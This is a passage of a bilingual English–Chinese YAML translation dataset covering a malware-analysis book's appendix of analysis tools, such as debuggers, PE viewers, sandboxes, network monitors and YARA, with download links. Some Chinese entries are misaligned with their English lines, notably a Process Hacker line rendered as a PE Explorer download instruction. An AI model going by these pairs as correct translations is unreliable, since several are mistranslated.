  zh: 文件和 Excel、Word、PowerPoint 文档中的 OLE 流，并且可以解压缩 Microsoft Office 文档的新格式。我们建议在 Office
    2007 之前的文档上使用 OfficeMalScanner 的扫描和暴力选项，在 Office 2007 之后的文档上使用膨胀选项。
- en: Office 2007 documents. You can download OfficeMalScanner from *http://www.reconstructer.org/*.
  id: totrans-552
  prefs: []
  type: TYPE_NORMAL
  zh: Office 2007 文档。您可以从 *http://www.reconstructer.org/* 下载 OfficeMalScanner。
- en: '**OllyDbg**'
  id: totrans-553
  prefs: []
  type: TYPE_NORMAL
  zh: '**OllyDbg**'
- en: OllyDbg is one of the most widely used debuggers for malware analysis.
  id: totrans-554
  prefs: []
  type: TYPE_NORMAL
  zh: OllyDbg 是用于恶意软件分析最广泛使用的调试器之一。
- en: We discuss OllyDbg extensively throughout the book, and Chapter 9 provides an
    in-depth introduction to the tool. OllyDbg is a user-mode x86
  id: totrans-555
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在整本书中详细讨论了 OllyDbg，第 9 章提供了对该工具的深入介绍。OllyDbg 是一个用户模式的 x86
- en: debugger with a GUI. Several plug-ins are available for OllyDbg, such as OllyDump
    for use while unpacking (discussed in Chapter 18). You can download OllyDbg for
    free from *http://www.ollydbg.de/*.
  id: totrans-556
  prefs: []
  type: TYPE_NORMAL
  zh: 调试器，具有 GUI。OllyDbg 有几个插件可用，例如 OllyDump，用于解包时使用（在第 18 章中讨论）。您可以从 *http://www.ollydbg.de/*
    免费下载 OllyDbg。
- en: '**OSR Driver Loader**'
  id: totrans-557
  prefs: []
  type: TYPE_NORMAL
  zh: '**OSR 驱动加载器**'
- en: OSR Driver Loader is a freely available tool for loading a device driver into
    memory. It is a GUI-based tool used for easily loading and starting a driver without
    rebooting. This is useful when you are dynamically **470**
  id: totrans-558
  prefs: []
  type: TYPE_NORMAL
  zh: OSR 驱动加载器是一款免费工具，用于将设备驱动程序加载到内存中。这是一个基于 GUI 的工具，用于轻松加载和启动驱动程序而无需重启。当你需要动态地**470**
- en: Appendix B
  id: totrans-559
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 B
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-560
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: analyzing a malicious device driver and don’t have the installer. We discuss
    the OSR Driver Loader tool in Chapter 10\. You can download it from *http://www.osronline.com/*.
  id: totrans-561
  prefs: []
  type: TYPE_NORMAL
  zh: 分析恶意设备驱动程序而没有安装程序。我们在第 10 章中讨论了 OSR 驱动加载器工具。您可以从 *http://www.osronline.com/*
    下载它。
- en: '**PDF Dissector**'
  id: totrans-562
  prefs: []
  type: TYPE_NORMAL
  zh: '**PDF Dissector**'
- en: PDF Dissector is a commercial GUI-based PDF analysis tool that graphically parses
    PDF elements and automatically decompresses objects, making it easy to extract
    malicious JavaScript. The program includes a JavaScript deobfuscator and interpreter
    to help you understand and execute malicious scripts. PDF Dissector can also be
    used to identify known vulnerabilities. This tool is available for purchase from
    *http://*
  id: totrans-563
  prefs: []
  type: TYPE_NORMAL
  zh: PDF Dissector 是一款商业 GUI 基础的 PDF 分析工具，可以图形化解析 PDF 元素并自动解压缩对象，使其易于提取恶意 JavaScript。该程序包括一个
    JavaScript 反混淆器和解释器，以帮助您理解和执行恶意脚本。PDF Dissector 还可以用来识别已知漏洞。您可以从 *http://* 购买此工具。
- en: '*www.zynamics.com/*.'
  id: totrans-564
  prefs: []
  type: TYPE_NORMAL
  zh: '*www.zynamics.com/*.'
- en: '**PDF Tools**'
  id: totrans-565
  prefs: []
  type: TYPE_NORMAL
  zh: '**PDF Tools**'
- en: 'PDF Tools is the classic tool kit for PDF analysis. The tool kit consists of
    two tools: *pdfid.py* and *pdf-parser.py*. *pdfid.py* scans a PDF for objects
    and tells you if it thinks a PDF contains JavaScript. Since most malicious PDFs
    use JavaScript, this information can help you quickly identify potentially risky
    PDFs. *pdf-parser.py* helps you examine the contents and important objects of
    a PDF file without rendering it. You can download the PDF'
  id: totrans-566
  prefs: []
  type: TYPE_NORMAL
  zh: PDF Tools 是 PDF 分析的经典工具包。该工具包包括两个工具：*pdfid.py* 和 *pdf-parser.py*。*pdfid.py*
    扫描 PDF 对象并告诉您它是否认为 PDF 包含 JavaScript。由于大多数恶意 PDF 都使用 JavaScript，这些信息可以帮助您快速识别可能存在风险的
    PDF。*pdf-parser.py* 帮助您检查 PDF 文件的内容和重要对象，而无需渲染它。您可以从 PDF
- en: tools for free from *http://blog.didierstevens.com/programs/pdf-tools/*.
  id: totrans-567
  prefs: []
  type: TYPE_NORMAL
  zh: 工具免费下载 *http://blog.didierstevens.com/programs/pdf-tools/*。
- en: '**PE Explorer**'
  id: totrans-568
  prefs: []
  type: TYPE_NORMAL
  zh: '**PE Explorer**'
- en: PE Explorer is a useful tool for viewing the PE header, sections, and import/export
    tables. It is more powerful than PEview because it allows you to edit structures.
    PE Explorer contains static unpackers for UPX-, Upack-, and NsPack-compressed
    files. This unpacking feature is seamless and saves a lot of time. You simply
    load the packed binary into PE
  id: totrans-569
  prefs: []
  type: TYPE_NORMAL
  zh: PE Explorer 是一款查看 PE 头部、段和导入/导出表的实用工具。它比 PEview 更强大，因为它允许你编辑结构。PE Explorer 包含用于
    UPX-、Upack- 和 NsPack 压缩文件的静态解包器。这种解包功能无缝且节省大量时间。你只需将打包的二进制文件加载到 PE
- en: Explorer, and it automatically unpacks the file. You can download a trial version
    or purchase the commercial version of PE Explorer from *http://*
  id: totrans-570
  prefs: []
  type: TYPE_NORMAL
  zh: Explorer，并且它会自动解包文件。你可以从 *http://*
- en: '*www.heaventools.com/*.'
  id: totrans-571
  prefs: []
  type: TYPE_NORMAL
  zh: '*www.heaventools.com/*.'
- en: '**PEiD**'
  id: totrans-572
  prefs: []
  type: TYPE_NORMAL
  zh: '**PEiD**'
- en: PEiD is a free static analysis tool used for packer and compiler detection.
  id: totrans-573
  prefs: []
  type: TYPE_NORMAL
  zh: PEiD 是一款免费的静态分析工具，用于检测打包器和编译器。
- en: It includes more than 600 signatures for detecting packers, cryptors, and compilers
    in PE format files. PEiD also has plug-ins available for download, the most useful
    of which is Krypto ANALyzer (KANAL). KANAL
  id: totrans-574
  prefs: []
  type: TYPE_NORMAL
  zh: 它包含超过 600 个签名，用于检测 PE 格式文件中的打包器、加密器和编译器。PEiD 还提供可供下载的插件，其中最有用的是 Krypto ANALyzer
    (KANAL)。KANAL
- en: can be used to find common cryptographic algorithms in PE files and provides
    the ability to export the information to IDA Pro. We discuss PEiD in Chapters
    1, 13, and 18\. Although the PEiD project has been discontinued, you should still
    be able to download the tool from *http://*
  id: totrans-575
  prefs: []
  type: TYPE_NORMAL
  zh: 可以用于在 PE 文件中查找常见的加密算法，并提供将信息导出到 IDA Pro 的能力。我们在第 1、13 和 18 章中讨论了 PEiD。尽管 PEiD
    项目已经停止，但你仍然可以从 *http://*
- en: '*www.peid.info/*.'
  id: totrans-576
  prefs: []
  type: TYPE_NORMAL
  zh: '*www.peid.info/*.'
- en: '**PEview**'
  id: totrans-577
  prefs: []
  type: TYPE_NORMAL
  zh: '**PEview**'
- en: PEview is a freely available tool for viewing the PE file structure. You can
    view the PE header, individual sections, and the import/export tables.
  id: totrans-578
  prefs: []
  type: TYPE_NORMAL
  zh: PEview 是一款免费查看 PE 文件结构的工具。你可以查看 PE 头部、单个段和导入/导出表。
- en: We use PEview throughout the book and discuss it in Chapter 1\. You can download
    PEview from *http://www.magma.ca/~wjr/*.
  id: totrans-579
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在整本书中使用了 PEview，并在第 1 章中讨论了它。你可以从 *http://www.magma.ca/~wjr/* 下载 PEview。
- en: Tools for Malware Analysis
  id: totrans-580
  prefs: []
  type: TYPE_NORMAL
  zh: 工具用于恶意软件分析
- en: '**471**'
  id: totrans-581
  prefs: []
  type: TYPE_NORMAL
  zh: '**471**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-582
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Process Explorer**'
  id: totrans-583
  prefs: []
  type: TYPE_NORMAL
  zh: '**Process Explorer**'
- en: Process Explorer is a powerful task manager that is used in dynamic analysis
    to provide insight into processes currently running on a system. Process Explorer
    can show you the DLLs for individual processes, handles, events, strings, and
    so on. We discuss Process Explorer in Chapter 3\. You can download Process Explorer
    as part of the Sysinternals Suite of tools from *http://www.sysinternals.com/*.
  id: totrans-584
  prefs: []
  type: TYPE_NORMAL
  zh: Process Explorer 是一款用于动态分析的功能强大的任务管理器，用于提供对系统上当前运行的进程的洞察。Process Explorer 可以显示单个进程的
    DLL、句柄、事件、字符串等。我们在第 3 章中讨论了 Process Explorer。你可以从 *http://www.sysinternals.com/*
    下载 Process Explorer 作为 Sysinternals 工具套件的一部分。
- en: '**Process Hacker**'
  id: totrans-585
  prefs: []
  type: TYPE_NORMAL
  zh: '**进程黑客**'
- en: Process Hacker is a powerful task manager similar to Process Explorer, but with
    many added features. It can scan for strings and regular expressions in memory,
    inject or unload a DLL, load a driver, create or start a service, and so on. You
    can download Process Hacker from *http://*
  id: totrans-586
  prefs: []
  type: TYPE_NORMAL
  zh: Process Hacker 是一款功能强大的任务管理器，类似于 Process Explorer，但增加了许多功能。它可以扫描内存中的字符串和正则表达式，注入或卸载
    DLL，加载驱动程序，创建或启动服务等。你可以从 *http://*
- en: '*processhacker.sourceforge.net/*.'
  id: totrans-587
  prefs: []
  type: TYPE_NORMAL
  zh: '*processhacker.sourceforge.net/* 下载 PE Explorer 的试用版或购买商业版本。'
- en: '**Process Monitor**'
  id: totrans-588
  prefs: []
  type: TYPE_NORMAL
  zh: '**进程监控**'
- en: Process Monitor (procmon) is a dynamic analysis tool useful for viewing real-time
    filesystem, registry, and process activity. You can filter its output to remove
    the noise. We discuss Process Monitor in Chapter 3\. You can download Process
    Monitor as part of the Sysinternals Suite of tools from *http://www.sysinternals.com/*.
  id: totrans-589
  prefs: []
  type: TYPE_NORMAL
  zh: Process Monitor (procmon) 是一款动态分析工具，用于查看实时文件系统、注册表和进程活动。你可以过滤其输出以去除噪音。我们在第 3
    章中讨论了 Process Monitor。你可以从 *http://www.sysinternals.com/* 下载 Process Monitor 作为
    Sysinternals 工具套件的一部分。
- en: '**Python**'
  id: totrans-590
  prefs: []
  type: TYPE_NORMAL
  zh: '**Python**'
- en: The Python programming language allows you quickly code tasks when performing
    malware analysis. Throughout the book and labs, we use Python. As discussed in
    Chapters 5 and 9, IDA Pro and Immunity Debugger have built-in Python interpreters,
    allowing you to quickly automate tasks or change the interface. We recommend learning
    Python and installing it on your analysis machine. Download Python for free from
    *http://www.python.org/*.
  id: totrans-591
  prefs: []
  type: TYPE_NORMAL
  zh: Python 编程语言允许您在执行恶意软件分析时快速编码任务。在整个书籍和实验中，我们使用 Python。如第 5 章和第 9 章所述，IDA Pro
    和 Immunity Debugger 内置了 Python 解释器，允许您快速自动化任务或更改界面。我们建议学习 Python 并将其安装在分析机器上。您可以从
    *http://www.python.org/* 免费下载 Python。
- en: '**Regshot**'
  id: totrans-592
  prefs: []
  type: TYPE_NORMAL
  zh: '**Regshot**'
- en: Regshot is a dynamic analysis tool that allows you to take and compare two registry
    snapshots. To use it, you simply take a snapshot of the registry, run the malware,
    wait for it to finish making any system changes, take the second snapshot, and
    then compare the two. Regshot can also be used for taking and comparing two snapshots
    of any filesystem directory you specify. You can download Regshot for free from
    *http://sourceforge*
  id: totrans-593
  prefs: []
  type: TYPE_NORMAL
  zh: Regshot 是一个动态分析工具，允许您获取并比较两个注册表快照。要使用它，您只需获取注册表的快照，运行恶意软件，等待它完成任何系统更改，获取第二个快照，然后比较这两个快照。Regshot
    还可以用于获取和比较您指定的任何文件系统目录的两个快照。您可以从 *http://sourceforge* 免费下载 Regshot。
- en: '*.net/projects/regshot/*.'
  id: totrans-594
  prefs: []
  type: TYPE_NORMAL
  zh: '*.net/projects/regshot/*.'
- en: '**Resource Hacker**'
  id: totrans-595
  prefs: []
  type: TYPE_NORMAL
  zh: '**Resource Hacker**'
- en: Resource Hacker is a useful static analysis utility for viewing, renaming, modifying,
    adding, deleting, and extracting resources for PE-formatted binaries. The tool
    works with both x86 and x64 architectures. Because malware often extracts more
    malware, a DLL, or a driver from its resource section at runtime, we find this
    tool useful for extracting those sections easily without running the malware.
    We discuss Resource Hacker in Chapter 1 and the Chapter 12 labs. You can download
    Resource Hacker from *http://www.angusj.com/resourcehacker/*.
  id: totrans-596
  prefs: []
  type: TYPE_NORMAL
  zh: Resource Hacker 是一个有用的静态分析工具，用于查看、重命名、修改、添加、删除和提取 PE 格式二进制文件的资源。该工具支持 x86 和
    x64 架构。由于恶意软件通常在运行时从其资源部分提取更多恶意软件、DLL 或驱动程序，我们发现这个工具在无需运行恶意软件的情况下轻松提取这些部分非常有用。我们在第
    1 章和第 12 章的实验中讨论了 Resource Hacker。您可以从 *http://www.angusj.com/resourcehacker/*
    下载 Resource Hacker。
- en: '**472**'
  id: totrans-597
  prefs: []
  type: TYPE_NORMAL
  zh: '**472**'
- en: Appendix B
  id: totrans-598
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 B
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-599
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Sandboxes**'
  id: totrans-600
  prefs: []
  type: TYPE_NORMAL
  zh: '**沙盒**'
- en: In Chapter 3, we discuss the pluses and minuses of using sandboxes.
  id: totrans-601
  prefs: []
  type: TYPE_NORMAL
  zh: 在第 3 章中，我们讨论了使用沙盒的优缺点。
- en: Many sandboxes are publicly available, and you can also write your own.
  id: totrans-602
  prefs: []
  type: TYPE_NORMAL
  zh: 许多沙盒都是公开可用的，您也可以编写自己的沙盒。
- en: Public sandboxes are a decent choice because they are always being developed
    in an effort to stay on top of the market. We demonstrate GFI Sandbox in Chapter
    3, but there are many others, including Joe Sandbox, BitBlaze, Comodo, ThreatExpert,
    Anubis, Norman, Cuckoo, Zero Wine, Buster Sandbox, and Minibis. As with hex editors,
    everyone has a preference, so try a few to see what works for you.
  id: totrans-603
  prefs: []
  type: TYPE_NORMAL
  zh: 公共沙盒是一个不错的选择，因为它们总是在努力保持市场领先。我们在第 3 章中演示了 GFI Sandbox，但还有很多其他选择，包括 Joe Sandbox、BitBlaze、Comodo、ThreatExpert、Anubis、Norman、Cuckoo、Zero
    Wine、Buster Sandbox 和 Minibis。与十六进制编辑器一样，每个人都有自己的偏好，所以尝试几个看看哪个适合您。
- en: '**Sandboxie and Buster Sandbox Analyzer**'
  id: totrans-604
  prefs: []
  type: TYPE_NORMAL
  zh: '**Sandboxie 和 Buster Sandbox Analyzer**'
- en: Sandboxie is a program that runs programs in an isolated environment to prevent
    them from making permanent changes to your system. Sandboxie was designed to allow
    secure web browsing, but its sandbox aspect makes it useful for malware analysis.
    For example, you can use it to capture filesystem and registry accesses of the
    program you are sandboxing.
  id: totrans-605
  prefs: []
  type: TYPE_NORMAL
  zh: Sandboxie 是一个在隔离环境中运行程序的程序，以防止它们对您的系统进行永久性更改。Sandboxie 被设计为允许安全的网络浏览，但其沙盒特性使其在恶意软件分析中非常有用。例如，您可以使用它来捕获您正在沙盒化的程序的文件系统和注册表访问。
- en: Buster Sandbox Analyzer (BSA) can be used with Sandboxie to provide automated
    analysis and reporting. Sandboxie and BSA can be downloaded from *http://www.sandboxie.com/*
    and *http://bsa.isoftware.nl/*.
  id: totrans-606
  prefs: []
  type: TYPE_NORMAL
  zh: Buster Sandbox Analyzer (BSA) 可以与 Sandboxie 一起使用，以提供自动分析和报告。您可以从 *http://www.sandboxie.com/*
    和 *http://bsa.isoftware.nl/* 下载 Sandboxie 和 BSA。
- en: '**Snort**'
  id: totrans-607
  prefs: []
  type: TYPE_NORMAL
  zh: '**Snort**'
- en: Snort is the most popular open source network intrusion detection system (IDS).
    We discuss writing network-based signatures for Snort in Chapter 14\. Snort can
    be run actively or offline against packet captures.
  id: totrans-608
  prefs: []
  type: TYPE_NORMAL
  zh: Snort 是最受欢迎的开源网络入侵检测系统 (IDS)。我们在第 14 章中讨论了为 Snort 编写基于网络的签名。Snort 可以在数据包捕获上主动或离线运行。
- en: If you write network signatures for malware, using Snort to test them is a good
    place to start. You can download Snort from *http://www.snort.org/*.
  id: totrans-609
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你为恶意软件编写网络签名，使用 Snort 测试它们是一个好的开始。你可以从 *http://www.snort.org/* 下载 Snort。
- en: '**Strings**'
  id: totrans-610
  prefs: []
  type: TYPE_NORMAL
  zh: '**Strings**'
- en: Strings is a useful static analysis tool for examining ASCII and Unicode strings
    in binary data. Using Strings is often a quick way to get a high-level overview
    of malware capability, but the program’s usefulness can be thwarted by packing
    and string obfuscation. We discuss Strings in Chapter 1\. You can download Strings
    as part of the Sysinternals Suite of tools from *http://www.sysinternals.com/*.
  id: totrans-611
  prefs: []
  type: TYPE_NORMAL
  zh: Strings 是一个用于检查二进制数据中 ASCII 和 Unicode 字符串的有用静态分析工具。使用 Strings 通常是一种快速了解恶意软件功能的方法，但程序的有用性可能会被打包和字符串混淆所阻碍。我们在第
    1 章中讨论了 Strings。你可以从 *http://www.sysinternals.com/* 下载 Strings 作为 Sysinternals
    工具套件的一部分。
- en: '**TCPView**'
  id: totrans-612
  prefs: []
  type: TYPE_NORMAL
  zh: '**TCPView**'
- en: TCPView is a tool for graphically displaying detailed listings of all TCP
  id: totrans-613
  prefs: []
  type: TYPE_NORMAL
  zh: TCPView 是一个用于图形显示所有 TCP
- en: and UDP endpoints on your system. This tool is useful in malware analysis because
    it allows you to see which process owns a given endpoint.
  id: totrans-614
  prefs: []
  type: TYPE_NORMAL
  zh: 和 UDP 端点在你的系统上。这个工具在恶意软件分析中很有用，因为它允许你看到哪个进程拥有特定的端点。
- en: TCPView can help you track down a process name when your analysis machine connects
    over a port and you have no idea which process is responsible (as often happens
    with process injection, as discussed in Chapter 12). You can download TCPView
    as part of the Sysinternals Suite of tools from *http://www.sysinternals.com/*.
  id: totrans-615
  prefs: []
  type: TYPE_NORMAL
  zh: TCPView 工具可以帮助你在分析机器通过端口连接时追踪进程名称，当你不知道哪个进程负责时（正如第 12 章中讨论的进程注入那样）。你可以从 *http://www.sysinternals.com/*
    下载 TCPView 作为 Sysinternals 工具套件的一部分。
- en: '**The Sleuth Kit**'
  id: totrans-616
  prefs: []
  type: TYPE_NORMAL
  zh: '**The Sleuth Kit**'
- en: The Sleuth Kit (TSK) is a C library and set of command-line tools for forensic
    analysis that can be used to find alternate data streams and files hidden by rootkits.
    TSK does not rely on the Windows API to process NTFS and FAT filesystems. You
    can run TSK on Linux or using Cygwin in Windows. You can download TSK for free
    from *http://www.sleuthkit.org/*.
  id: totrans-617
  prefs: []
  type: TYPE_NORMAL
  zh: The Sleuth Kit (TSK) 是一个用于法医分析的 C 库和一组命令行工具，可以用来查找由 rootkits 隐藏的替代数据流和文件。TSK
    不依赖于 Windows API 来处理 NTFS 和 FAT 文件系统。你可以在 Linux 上运行 TSK，或者在 Windows 上使用 Cygwin。你可以从
    *http://www.sleuthkit.org/* 免费下载 TSK。
- en: Tools for Malware Analysis
  id: totrans-618
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件分析工具
- en: '**473**'
  id: totrans-619
  prefs: []
  type: TYPE_NORMAL
  zh: '**473**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-620
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Tor**'
  id: totrans-621
  prefs: []
  type: TYPE_NORMAL
  zh: '**Tor**'
- en: Tor is a freely available onion routing network, allowing you to browse anonymously
    over the Internet. We recommend using Tor whenever conducting research during
    analysis, such as checking IP addresses, performing Internet searches, accessing
    domains, or looking for any information you might not want exposed. We don’t generally
    recommend letting malware connect over a network, but if you do, you should use
    a technology like Tor. After you install Tor, and before you start browsing, visit
    a site like *http://whatismyipaddress.com/* to confirm that the IP returned by
    the website is not your IP address. Tor can be downloaded for free from *https://www.torproject.org/*.
  id: totrans-622
  prefs: []
  type: TYPE_NORMAL
  zh: Tor 是一个免费的可用的洋葱路由网络，允许你在互联网上匿名浏览。我们建议在分析过程中进行任何研究时使用 Tor，例如检查 IP 地址、执行互联网搜索、访问域名或寻找你可能不希望公开的信息。我们通常不建议让恶意软件通过网络连接，但如果你这样做，你应该使用像
    Tor 这样的技术。安装 Tor 后，在开始浏览之前，访问类似 *http://whatismyipaddress.com/* 的网站以确认网站返回的 IP
    地址不是你的 IP 地址。Tor 可以从 *https://www.torproject.org/* 免费下载。
- en: '**Truman**'
  id: totrans-623
  prefs: []
  type: TYPE_NORMAL
  zh: '**Truman**'
- en: Truman is a tool for creating a safe environment without using virtual machines.
    It consists of a Linux server and a client machine running Windows. Like INetSim,
    Truman emulates the Internet, but it also provides functionality to easily grab
    memory from the Windows machine and reimage it quickly. Truman comes with scripts
    to emulate services and perform analysis on Linux. Even though this tool is no
    longer in development, it can help you understand how to set up your own bare-metal
    environment. You can download Truman for free from *http://*
  id: totrans-624
  prefs: []
  type: TYPE_NORMAL
  zh: Truman 是一个无需使用虚拟机即可创建安全环境的工具。它由一个 Linux 服务器和一个运行 Windows 的客户端机器组成。像 INetSim
    一样，Truman 模拟互联网，但它还提供了从 Windows 机器中轻松抓取内存并快速重新映像的功能。Truman 随附有模拟服务和在 Linux 上进行分析的脚本。尽管这个工具不再开发，但它可以帮助你了解如何设置自己的裸机环境。你可以从
    *http://* 免费下载 Truman。
- en: '*www.secureworks.com/research/tools/truman/*.'
  id: totrans-625
  prefs: []
  type: TYPE_NORMAL
  zh: '*www.secureworks.com/research/tools/truman/*.'
- en: '**WinDbg**'
  id: totrans-626
  prefs: []
  type: TYPE_NORMAL
  zh: '**WinDbg**'
- en: WinDbg is the most popular all-around debugger, distributed freely by Microsoft.
    You can use it to debug user-mode, kernel-mode, x86, and x64
  id: totrans-627
  prefs: []
  type: TYPE_NORMAL
  zh: WinDbg 是最受欢迎的全能调试器，由微软免费分发。您可以使用它来调试用户模式、内核模式、x86 和 x64
- en: malware. WinDbg lacks OllyDbg’s robust GUI, providing a command-line interface
    instead. In Chapter 10, we focus on the kernel-mode usage of WinDbg. Many malware
    analysts choose to use OllyDbg for user-mode debugging and WinDbg for kernel debugging.
    WinDbg can be downloaded independently or as part of the Windows SDK from *http://msdn*
  id: totrans-628
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件。WinDbg 缺乏 OllyDbg 的强大图形用户界面，而是提供命令行界面。在第 10 章中，我们专注于 WinDbg 的内核模式使用。许多恶意软件分析师选择使用
    OllyDbg 进行用户模式调试，使用 WinDbg 进行内核调试。WinDbg 可以独立下载，也可以作为 Windows SDK 的一部分从 *http://msdn*
- en: '*.microsoft.com/*.'
  id: totrans-629
  prefs: []
  type: TYPE_NORMAL
  zh: '*.microsoft.com/*.'
- en: '**Wireshark**'
  id: totrans-630
  prefs: []
  type: TYPE_NORMAL
  zh: '**Wireshark**'
- en: Wireshark is an open source network packet analyzer and useful tool for dynamic
    analysis. You can use it to capture network traffic generated by malware and to
    analyze many different protocols. Wireshark is the most popular freely available
    tool for packet capturing and has an easy-to-use GUI. We discuss Wireshark usage
    in Chapter 3\. You can download Wireshark from *http://www.wireshark.org/*.
  id: totrans-631
  prefs: []
  type: TYPE_NORMAL
  zh: Wireshark 是一个开源的网络数据包分析器，也是动态分析的有用工具。您可以使用它捕获恶意软件生成的网络流量，并分析许多不同的协议。Wireshark
    是最受欢迎的免费数据包捕获工具，具有易于使用的图形用户界面。我们在第 3 章中讨论了 Wireshark 的使用方法。您可以从 *http://www.wireshark.org/*
    下载 Wireshark。
- en: '**UPX**'
  id: totrans-632
  prefs: []
  type: TYPE_NORMAL
  zh: '**UPX**'
- en: Ultimate Packer for eXecutables (UPX) is the most popular packer used by malware
    authors. In Chapters 1 and 18, we discuss how to automatically and manually unpack
    malware that uses UPX. If you encounter this packer in the wild, try to unpack
    the malware with upx –d. You can download this packer from *http://upx.sourceforge.net/*.
  id: totrans-633
  prefs: []
  type: TYPE_NORMAL
  zh: Ultimate Packer for eXecutables (UPX) 是恶意软件作者使用的最流行的打包器。在第 1 章和第 18 章中，我们讨论了如何自动和手动解包使用
    UPX 的恶意软件。如果您在野外遇到这个打包器，尝试使用 upx –d 解包恶意软件。您可以从 *http://upx.sourceforge.net/*
    下载此打包器。
- en: '**VERA**'
  id: totrans-634
  prefs: []
  type: TYPE_NORMAL
  zh: '**VERA**'
- en: Visualizing Executables for Reversing and Analysis (VERA) is a tool for visualizing
    compiled executables for malware analysis. It uses the Ether **474**
  id: totrans-635
  prefs: []
  type: TYPE_NORMAL
  zh: 可视化可执行文件以进行逆向工程和分析（VERA）是一个用于可视化编译的可执行文件以进行恶意软件分析的工具。它使用 Ether **474**
- en: Appendix B
  id: totrans-636
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 B
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-637
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: framework to generate visualizations based on dynamic trace data to help with
    analysis. VERA gives you a high-level overview of malware and can help with unpacking.
    It can also interface with IDA Pro to help you browse between the VERA graphs
    and IDA Pro disassembly. You can download VERA from *http://www.offensivecomputing.net/*.
  id: totrans-638
  prefs: []
  type: TYPE_NORMAL
  zh: 框架，根据动态跟踪数据生成可视化，以帮助分析。VERA 提供了恶意软件的高级概述，并有助于解包。它还可以与 IDA Pro 接口，帮助您在 VERA 图表和
    IDA Pro 汇编之间浏览。您可以从 *http://www.offensivecomputing.net/* 下载 VERA。
- en: '**VirusTotal**'
  id: totrans-639
  prefs: []
  type: TYPE_NORMAL
  zh: '**VirusTotal**'
- en: VirusTotal is an online service that scans malware using many different antivirus
    programs. You can upload a file directly to VirusTotal, and it will check the
    file with more than 40 different antivirus engines. If you don’t want to upload
    your malware, you can also search the MD5 hash to see if VirusTotal has seen the
    sample before. We discuss VirusTotal at the start of Chapter 1 since it is often
    a useful first step during malware analysis. You can access VirusTotal at *http://www.virustotal.com/*.
  id: totrans-640
  prefs: []
  type: TYPE_NORMAL
  zh: VirusTotal 是一个使用多种不同杀毒程序扫描恶意软件的在线服务。您可以直接将文件上传到 VirusTotal，它将使用超过 40 种不同的杀毒引擎检查该文件。如果您不想上传您的恶意软件，您也可以搜索
    MD5 哈希值，以查看 VirusTotal 是否之前已经看到过该样本。我们在第 1 章的开始讨论了 VirusTotal，因为它在恶意软件分析中通常是一个有用的第一步。您可以通过
    *http://www.virustotal.com/* 访问 VirusTotal。
- en: '**VMware Workstation**'
  id: totrans-641
  prefs: []
  type: TYPE_NORMAL
  zh: '**VMware Workstation**'
- en: VMware Workstation is a popular desktop virtualization product. There are many
    alternatives to VMware, but we use it in this book due to its popularity. Chapter
    2 highlights many VMware features, such as virtual networking, snapshotting (which
    allows you to save the current state of a virtual machine), and cloning an existing
    virtual machine. You can purchase VMware Workstation from *http://www.vmware.com/*
    or download VMware Player (with limited functionality) for free from the same
    site.
  id: totrans-642
  prefs: []
  type: TYPE_NORMAL
  zh: VMware Workstation 是一个流行的桌面虚拟化产品。有许多 VMware 的替代品，但我们在这本书中使用它，因为它很受欢迎。第 2 章强调了
    VMware 的许多功能，例如虚拟网络、快照（允许您保存虚拟机的当前状态）以及克隆现有的虚拟机。您可以从 *http://www.vmware.com/*
    购买 VMware Workstation，或从同一网站免费下载具有有限功能的 VMware Player。
- en: '**Volatility Framework**'
  id: totrans-643
  prefs: []
  type: TYPE_NORMAL
  zh: '**Volatility Framework**'
- en: The Volatility Framework is an open source collection of tools written in Python
    for analyzing live memory captures. This suite of tools is useful for malware
    analysis, as you can use it to extract injected DLLs, perform rootkit detection,
    find hidden processes, and so on. This tool suite has many users and contributors,
    so new capabilities are constantly being developed. You can download the latest
    version from *http://code.google*
  id: totrans-644
  prefs: []
  type: TYPE_NORMAL
  zh: Volatility框架是一个开源的工具集合，用Python编写，用于分析实时内存捕获。这个工具集对于恶意软件分析很有用，因为它可以用来提取注入的DLL文件，执行rootkit检测，查找隐藏进程等。这个工具集拥有许多用户和贡献者，因此不断开发新的功能。您可以从*http://code.google*
- en: '*.com/p/volatility/*.'
  id: totrans-645
  prefs: []
  type: TYPE_NORMAL
  zh: '*.com/p/volatility/*.'
- en: '**YARA**'
  id: totrans-646
  prefs: []
  type: TYPE_NORMAL
  zh: '**YARA**'
- en: YARA is an open source project used to identify and classify malware samples
    that will allow you to create descriptions of malware families based on strings
    or any other binary patterns you find in them. These descriptions are called *rules*,
    and they consist of a set of strings and logic.
  id: totrans-647
  prefs: []
  type: TYPE_NORMAL
  zh: YARA是一个开源项目，用于识别和分类恶意软件样本，它允许您根据在样本中找到的字符串或任何其他二进制模式创建恶意软件家族的描述。这些描述被称为*规则*，它们由一组字符串和逻辑组成。
- en: Rules are applied to binary data like files or memory in order to classify a
    sample. This tool is useful for creating your own custom antivirus-like software
    and signatures. You can download YARA for free from *http://*
  id: totrans-648
  prefs: []
  type: TYPE_NORMAL
  zh: 规则应用于二进制数据，如文件或内存，以对样本进行分类。这个工具对于创建自己的类似杀毒软件和签名很有用。您可以从*http://*免费下载YARA。
- en: '*code.google.com/p/yara-project/*.'
  id: totrans-649
  prefs: []
  type: TYPE_NORMAL
  zh: '*code.google.com/p/yara-project/*.'
- en: '**Zero Wine**'
  id: totrans-650
  prefs: []
  type: TYPE_NORMAL
  zh: '**Zero Wine**'
